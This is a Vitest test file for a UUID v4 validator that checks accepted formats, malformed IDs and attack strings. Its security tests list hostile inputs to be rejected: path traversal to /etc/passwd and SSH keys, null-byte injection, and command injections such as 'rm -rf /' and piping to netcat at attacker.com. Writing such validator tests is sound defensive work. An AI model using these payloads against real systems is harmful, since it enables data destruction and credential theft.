import { describe, it, expect } from "vitest";
import { isValidUUID, assertValidUUID } from "../uuid";

describe("UUID Validation", () => {
  describe("isValidUUID", () => {
    it("returns true for valid UUID v4", () => {
      const validUUIDs = [
        "550e8400-e29b-41d4-a716-446655440000",
        "f47ac10b-58cc-4372-a567-0e02b2c3d479",
        "6ba7b810-9dad-41d1-80b4-00c04fd430c8",
        "00000000-0000-4000-8000-000000000000",
        "FFFFFFFF-FFFF-4FFF-BFFF-FFFFFFFFFFFF",
      ];

      validUUIDs.forEach((uuid) => {
        expect(isValidUUID(uuid)).toBe(true);
      });
    });

    it("returns true for UUID with uppercase letters", () => {
      expect(isValidUUID("550E8400-E29B-41D4-A716-446655440000")).toBe(true);
    });

    it("returns true for UUID with mixed case", () => {
      expect(isValidUUID("550e8400-E29B-41d4-a716-446655440000")).toBe(true);
    });

    it("returns false for path traversal attempts", () => {
      const pathTraversals = [
        "../../../etc/passwd",
        "../../etc/passwd",
        "../file.txt",
        "../../../../../../root/.ssh/id_rsa",
      ];

      pathTraversals.forEach((path) => {
        expect(isValidUUID(path)).toBe(false);
      });
    });

    it("returns false for non-UUID strings", () => {
      const invalidStrings = [
        "not-a-uuid",
        "12345678-1234-1234-1234-123456789012", // wrong version
        "550e8400-e29b-31d4-a716-446655440000", // version 3 instead of 4
        "550e8400-e29b-51d4-a716-446655440000", // version 5 instead of 4
        "550e8400-e29b-41d4-1716-446655440000", // wrong variant
        "",
        " ",
        "null",
        "undefined",
      ];

      invalidStrings.forEach((str) => {
        expect(isValidUUID(str)).toBe(false);
      });
    });

    it("returns false for UUID with wrong format", () => {
      const malformedUUIDs = [
        "550e8400e29b41d4a716446655440000", // missing dashes
        "550e8400-e29b-41d4-a716", // too short
        "550e8400-e29b-41d4-a716-446655440000-extra", // too long
        "550e8400-e29b-41d4-a716-44665544000g", // invalid character 'g'
        "550e8400_e29b_41d4_a716_446655440000", // underscores instead of dashes
      ];

      malformedUUIDs.forEach((uuid) => {
        expect(isValidUUID(uuid)).toBe(false);
      });
    });

    it("returns false for directory traversal with slashes", () => {
      const slashAttempts = [
        "550e8400/../passwd",
        "/etc/passwd",
        "./file.txt",
        "dir/file.txt",
      ];

      slashAttempts.forEach((attempt) => {
        expect(isValidUUID(attempt)).toBe(false);
      });
    });

    it("returns false for null bytes and special characters", () => {
      const specialChars = [
        "550e8400\x00e29b41d4a716446655440000",
        "550e8400\ne29b41d4a716446655440000",
        "550e8400\re29b41d4a716446655440000",
        "550e8400;e29b41d4a716446655440000",
      ];

      specialChars.forEach((str) => {
        expect(isValidUUID(str)).toBe(false);
      });
    });
  });

  describe("assertValidUUID", () => {
    it("does not throw for valid UUID", () => {
      expect(() => {
        assertValidUUID("550e8400-e29b-41d4-a716-446655440000");
      }).not.toThrow();
    });

    it("throws error for invalid UUID", () => {
      expect(() => {
        assertValidUUID("not-a-uuid");
      }).toThrow("Invalid ID format. Expected UUID v4.");
    });

    it("throws error with custom field name", () => {
      expect(() => {
        assertValidUUID("not-a-uuid", "photoId");
      }).toThrow("Invalid photoId format. Expected UUID v4.");
    });

    it("throws error for path traversal attempts", () => {
      expect(() => {
        assertValidUUID("../../../etc/passwd", "photoId");
      }).toThrow("Invalid photoId format. Expected UUID v4.");
    });

    it("throws error for empty string", () => {
      expect(() => {
        assertValidUUID("", "albumId");
      }).toThrow("Invalid albumId format. Expected UUID v4.");
    });
  });

  describe("Security Tests", () => {
    it("prevents path traversal to parent directories", () => {
      const attacks = [
        "..",
        "../",
        "../../",
        "../../../",
        "....//",
        "..\\",
        "..\\..\\",
      ];

      attacks.forEach((attack) => {
        expect(isValidUUID(attack)).toBe(false);
      });
    });

    it("prevents absolute path access", () => {
      const absolutePaths = [
        "/etc/passwd",
        "/var/log/",
        "/root/.ssh/id_rsa",
        "C:\\Windows\\System32",
        "\\\\server\\share",
      ];

      absolutePaths.forEach((path) => {
        expect(isValidUUID(path)).toBe(false);
      });
    });

    it("prevents null byte injection", () => {
      const nullByteAttacks = [
        "550e8400-e29b-41d4-a716-446655440000\x00.jpg",
        "\x00etc/passwd",
        "file.txt\x00",
      ];

      nullByteAttacks.forEach((attack) => {
        expect(isValidUUID(attack)).toBe(false);
      });
    });

    it("prevents command injection attempts", () => {
      const commandInjections = [
        "550e8400; rm -rf /",
        "550e8400 && cat /etc/passwd",
        "550e8400 | nc attacker.com 1234",
        "$(whoami)",
        "`whoami`",
      ];

      commandInjections.forEach((injection) => {
        expect(isValidUUID(injection)).toBe(false);
      });
    });
  });
});
